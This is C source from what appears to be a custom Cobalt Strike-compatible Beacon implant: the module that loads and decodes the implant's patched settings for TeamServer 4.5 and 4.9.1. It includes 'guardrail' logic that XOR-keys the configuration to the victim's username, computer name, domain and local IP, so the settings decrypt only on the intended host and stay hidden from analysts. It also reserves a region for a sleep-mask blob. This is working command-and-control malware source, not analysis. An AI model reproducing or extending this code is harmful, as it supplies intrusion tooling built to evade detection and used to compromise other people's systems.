/* API to retrieve and set Beacon settings */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdlib.h>
#include <string.h>
#include "parse.h"
#include "beacon.h"
#include "track_memory.h"
#include "datastore.h"

#pragma comment(lib, "ws2_32.lib")

#define TYPE_NONE  0
#define TYPE_SHORT 1
#define TYPE_INT   2
#define TYPE_PTR   3

typedef struct {
	unsigned short type;
	union {
		unsigned short s_value;
		unsigned int   i_value;
		char *         p_value;
	} value;
} setting;

setting * settings;
setting * guard_settings;
void    * beacon_ptr;

/* 4.9.1 TeamServer writes exactly Settings.PATCH_SIZE bytes at AAAABBBB
 * (see BeaconPayload.java / Settings.java). The template allocation is larger
 * so 4.5's 4096-byte blob still fits. Checksum and XOR 0x2E cover this length. */
#define SETTINGS_BLOB_SIZE 6144
#define GUARD_BLOB_SIZE    2048

#define GUARD_USER             5
#define GUARD_COMPUTER         6
#define GUARD_DOMAIN           7
#define GUARD_LOCAL_IP         8
#define GUARD_PAYLOAD_CHECKSUM 9

static const char GUARD_MAGIC[] =
	"GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";

/* Test hook: when set, settings_init uses these instead of the live host env.
 * Call with user==NULL to clear. Production never calls this. */
static int          env_override_set;
static char         env_override_user[256];
static char         env_override_computer[256];
static char         env_override_domain[256];
static unsigned int env_override_ip_nbo;

void settings_set_env_override(const char * user, const char * computer, const char * domain, unsigned int ip_nbo) {
	if (user == NULL) {
		env_override_set = 0;
		memset(env_override_user, 0, sizeof(env_override_user));
		memset(env_override_computer, 0, sizeof(env_override_computer));
		memset(env_override_domain, 0, sizeof(env_override_domain));
		env_override_ip_nbo = 0;
		return;
	}
	env_override_set = 1;
	memset(env_override_user, 0, sizeof(env_override_user));
	memset(env_override_computer, 0, sizeof(env_override_computer));
	memset(env_override_domain, 0, sizeof(env_override_domain));
	strncpy(env_override_user, user, sizeof(env_override_user) - 1);
	if (computer != NULL)
		strncpy(env_override_computer, computer, sizeof(env_override_computer) - 1);
	if (domain != NULL)
		strncpy(env_override_domain, domain, sizeof(env_override_domain) - 1);
	env_override_ip_nbo = ip_nbo;
}

setting setting_get(int id) {
	return settings[id];
}

/* PATCH_SIZE = sizeof(arguments) */
/* 4.9.1: TeamServer writes a 6144-byte randomized-padded blob at the AAAABBBB
 * magic (4.5 wrote 4096). 8192 keeps headroom for both TS generations. */
#define PATCH_SIZE 8192

/* patch this value with something that matches our arguments structure */
const char mystrs[4096] = "TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ"; /* const puts this right where we want it! */
char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR";

/* 4.9.1 template regions. The 4.9.1 TeamServer patches these magic placeholders
 * by file-wide string search (BeaconPayload.indexOf / replaceAt):
 *
 *   SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK -> 16384-byte sleep-mask blob (patchSleepMaskString
 *     has NO missing-magic guard, so payload generation hard-fails without it).
 *     The blob is the official BOF sleep mask; opaque to this beacon, whose own
 *     sleep loop does not consume it.
 *
 *   GGGGuuuu...dddd -> 2048-byte BeaconGuardrails blob. applyPatch is optional
 *     on the TS (skips if magic is absent). When patched, settings_init reverses
 *     the env XOR chain and checksum before parsing. Unpatched magic = no-op.
 *
 * The 4.5 TeamServer ignores both regions, so one binary serves 4.5 and 4.9.1. */
char sleepmask_region[16416] = "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK";
char guard_region[2112] = "GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";

unsigned short setting_short(int field) {
	setting value = setting_get(field);
	if (value.type == TYPE_SHORT)
		return value.value.s_value;

	return 0;
}

unsigned int setting_int(int field) {
	setting value = setting_get(field);
	if (value.type == TYPE_INT)
		return value.value.i_value;

	return 0;
}

unsigned int setting_option(int field, unsigned short value) {
	unsigned short flags = setting_short(field);
	if ((flags & value) == value)
		return TRUE;
	else
		return FALSE;
}

void * get_beacon_ptr() {
	return beacon_ptr;
}

char * setting_ptr(int field) {
	setting value = setting_get(field);
	if (value.type == TYPE_PTR)
		return value.value.p_value;

	return NULL;
}

unsigned int setting_len(int field) {
	return strlen(setting_ptr(field));
}

/* BeaconGuardrails.mask_forwards: data[i] ^= key[i % keylen] */
static void xor_forwards(unsigned char * data, int dlen, const unsigned char * key, int klen) {
	int i;
	if (data == NULL || key == NULL || dlen <= 0 || klen <= 0)
		return;
	for (i = 0; i < dlen; i++)
		data[i] = (unsigned char)(data[i] ^ key[i % klen]);
}

/* BeaconGuardrails.mask_backwards: data[i] ^= key[keylen-1 - i%keylen] */
static void xor_backwards(unsigned char * data, int dlen, const unsigned char * key, int klen) {
	int i;
	if (data == NULL || key == NULL || dlen <= 0 || klen <= 0)
		return;
	for (i = 0; i < dlen; i++)
		data[i] = (unsigned char)(data[i] ^ key[klen - 1 - (i % klen)]);
}

/* BeaconGuardrails.quickChecksum: Σ(byte * (i%3+1)) % 99999999 */
static unsigned int quick_checksum(const unsigned char * data, int len) {
	unsigned long sum = 0;
	int i;
	if (data == NULL || len <= 0)
		return 0;
	for (i = 0; i < len; i++)
		sum = (sum + (unsigned long)((data[i] & 0xFF) * (i % 3 + 1))) % 99999999UL;
	return (unsigned int)sum;
}

static void ascii_tolower_buf(char * s) {
	if (s == NULL)
		return;
	for (; *s != '\0'; s++) {
		if (*s >= 'A' && *s <= 'Z')
			*s = (char)(*s + 32);
	}
}

static unsigned short guard_short(int field) {
	if (guard_settings == NULL)
		return 0;
	if (guard_settings[field].type == TYPE_SHORT)
		return guard_settings[field].value.s_value;
	return 0;
}

static unsigned int guard_int(int field) {
	if (guard_settings == NULL)
		return 0;
	if (guard_settings[field].type == TYPE_INT)
		return guard_settings[field].value.i_value;
	return 0;
}

/* flag encoding from BeaconGuardrails.buildGuardSettings:
 *   1           = exact (full local name)
 *   1+keylen    = suffix wildcard (first keylen chars of local name)
 *   257+keylen  = prefix wildcard (last keylen chars of local name)
 * Returns key length; writes bytes (no NUL) into out. */
static int derive_name_key(char * out, int outmax, const char * name, unsigned short flag) {
	int nlen;
	int klen;
	if (out == NULL || outmax <= 0 || name == NULL || flag == 0)
		return 0;
	nlen = (int)strlen(name);
	if (nlen <= 0)
		return 0;
	if (flag == 1) {
		klen = nlen;
	}
	else if (flag < 257) {
		klen = (int)flag - 1;
		if (klen > nlen)
			klen = nlen;
	}
	else {
		klen = (int)flag - 257;
		if (klen > nlen)
			klen = nlen;
		name = name + (nlen - klen);
	}
	if (klen > outmax)
		klen = outmax;
	if (klen <= 0)
		return 0;
	memcpy(out, name, klen);
	return klen;
}

static void unmask_with_name(unsigned char * blob, int blen, const char * name, unsigned short flag) {
	char key[256];
	int klen;
	if (flag == 0)
		return;
	klen = derive_name_key(key, (int)sizeof(key), name, flag);
	if (klen > 0)
		xor_forwards(blob, blen, (unsigned char *)key, klen);
}

static void unmask_with_ip(unsigned char * blob, int blen, unsigned int ip_nbo, unsigned int segs) {
	unsigned char key[4];
	if (segs == 0)
		return;
	memcpy(key, &ip_nbo, 4); /* S_addr is already network-order bytes */
	if (segs > 4)
		segs = 4;
	if (segs < 4)
		memset(key + segs, 0, 4 - segs);
	xor_forwards(blob, blen, key, 4);
}

static unsigned int collect_local_ip_nbo(void) {
	WSADATA wsa;
	SOCKET sd;
	INTERFACE_INFO list[20];
	DWORD nbytes = 0;
	unsigned int ret = 0;
	int n;
	int i;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	sd = WSASocket(AF_INET, SOCK_DGRAM, 0, 0, 0, 0);
	if (sd == INVALID_SOCKET)
		return 0;
	if (WSAIoctl(sd, SIO_GET_INTERFACE_LIST, 0, 0, &list, sizeof(list), &nbytes, 0, 0) == 0) {
		n = (int)(nbytes / sizeof(INTERFACE_INFO));
		for (i = 0; i < n; i++) {
			SOCKADDR_IN * addr = (SOCKADDR_IN *)&(list[i].iiAddress);
			u_long flags = list[i].iiFlags;
			if (!(flags & IFF_LOOPBACK) && (flags & IFF_UP)) {
				ret = addr->sin_addr.S_un.S_addr;
				break;
			}
		}
	}
	closesocket(sd);
	return ret;
}

static void parse_tlv_table(setting * table, int ntable, char * blob, int bloblen) {
	datap parser;
	short index;
	short type;
	short length;
	char * ptr;

	data_init(&parser, blob, bloblen);
	while (TRUE) {
		index = data_short(&parser);
		if (index <= 0)
			break;
		type = data_short(&parser);
		length = data_short(&parser);
		if (index >= ntable) {
			data_ptr(&parser, length);
			continue;
		}
		table[index].type = type;
		switch (type) {
		case TYPE_SHORT:
			table[index].value.s_value = data_short(&parser);
			break;
		case TYPE_INT:
			table[index].value.i_value = data_int(&parser);
			break;
		case TYPE_PTR:
			ptr = data_ptr(&parser, length);
			if (ptr == NULL)
				break;
			table[index].value.p_value = (char *)malloc(length);
			if (table[index].value.p_value == NULL)
				break;
			memcpy(table[index].value.p_value, ptr, length);
			track_memory_add(table[index].value.p_value, length, TRACK_MEMORY_MALLOC, TRUE, NULL);
			break;
		default:
			data_ptr(&parser, length);
			break;
		}
	}
}

void settings_init(void * bptr) {
	int x;
	char user[256];
	char computer[256];
	char domain[256];
	unsigned int ip_nbo;
	DWORD nsize;
	int guard_patched;

	beacon_ptr = bptr;

	settings = (setting *)malloc(sizeof(setting) * 128);
	memset(settings, 0, sizeof(setting) * 128);
	track_memory_add(settings, sizeof(setting) * 128, TRACK_MEMORY_MALLOC, TRUE, NULL);

	guard_settings = (setting *)malloc(sizeof(setting) * 128);
	memset(guard_settings, 0, sizeof(setting) * 128);
	track_memory_add(guard_settings, sizeof(setting) * 128, TRACK_MEMORY_MALLOC, TRUE, NULL);

	memset(user, 0, sizeof(user));
	memset(computer, 0, sizeof(computer));
	memset(domain, 0, sizeof(domain));
	ip_nbo = 0;

	if (env_override_set) {
		strncpy(user, env_override_user, sizeof(user) - 1);
		strncpy(computer, env_override_computer, sizeof(computer) - 1);
		strncpy(domain, env_override_domain, sizeof(domain) - 1);
		ip_nbo = env_override_ip_nbo;
	}
	else {
		nsize = (DWORD)sizeof(user);
		GetUserNameA(user, &nsize);
		nsize = (DWORD)sizeof(computer);
		GetComputerNameA(computer, &nsize);
		nsize = (DWORD)sizeof(domain);
		GetComputerNameExA(ComputerNameDnsDomain, domain, &nsize);
		ip_nbo = collect_local_ip_nbo();
	}
	ascii_tolower_buf(user);
	ascii_tolower_buf(computer);
	ascii_tolower_buf(domain);

	/* Unpatched template (4.5 TS, or 4.9.1 generation skipped applyPatch):
	 * the GGGG magic is still sitting in the region — skip the whole chain. */
	guard_patched = (memcmp(guard_region, GUARD_MAGIC, sizeof(GUARD_MAGIC) - 1) != 0);

	if (guard_patched) {
		unsigned char guard_work[GUARD_BLOB_SIZE];

		memcpy(guard_work, guard_region, GUARD_BLOB_SIZE);
		/* buildGuardPatch: mask_backwards(mask_forwards(plain, [0x8A]), settings) */
		xor_backwards(guard_work, GUARD_BLOB_SIZE, (unsigned char *)myargs, SETTINGS_BLOB_SIZE);
		{
			unsigned char k8a = 0x8A;
			xor_forwards(guard_work, GUARD_BLOB_SIZE, &k8a, 1);
		}
		parse_tlv_table(guard_settings, 128, (char *)guard_work, GUARD_BLOB_SIZE);
		memset(guard_work, 0, sizeof(guard_work));

		/* Reverse of BeaconPayload hashWithUsername/Computer/Domain/LocalIP
		 * (those run after XOR 0x2E, so unmask BEFORE the 0x2E pass). */
		unmask_with_ip((unsigned char *)myargs, SETTINGS_BLOB_SIZE, ip_nbo, guard_int(GUARD_LOCAL_IP));
		unmask_with_name((unsigned char *)myargs, SETTINGS_BLOB_SIZE, domain, guard_short(GUARD_DOMAIN));
		unmask_with_name((unsigned char *)myargs, SETTINGS_BLOB_SIZE, computer, guard_short(GUARD_COMPUTER));
		unmask_with_name((unsigned char *)myargs, SETTINGS_BLOB_SIZE, user, guard_short(GUARD_USER));
	}

	for (x = 0; x < SETTINGS_BLOB_SIZE; x++)
		myargs[x] = (char)(myargs[x] ^ 0x2E);

	if (guard_patched && guard_int(GUARD_PAYLOAD_CHECKSUM) != 0) {
		unsigned int expect = guard_int(GUARD_PAYLOAD_CHECKSUM) - 1;
		unsigned int got = quick_checksum((unsigned char *)myargs, SETTINGS_BLOB_SIZE);
		if (got != expect) {
			/* Fail closed: leave the settings table empty so the beacon cannot
			 * talk. Matches official "checksum pass → parse entries". */
			memset(myargs, 0, PATCH_SIZE);
			return;
		}
	}

	parse_tlv_table(settings, 128, myargs, SETTINGS_BLOB_SIZE);
	memset(myargs, 0, PATCH_SIZE);
	cs49_apply_settings();
}
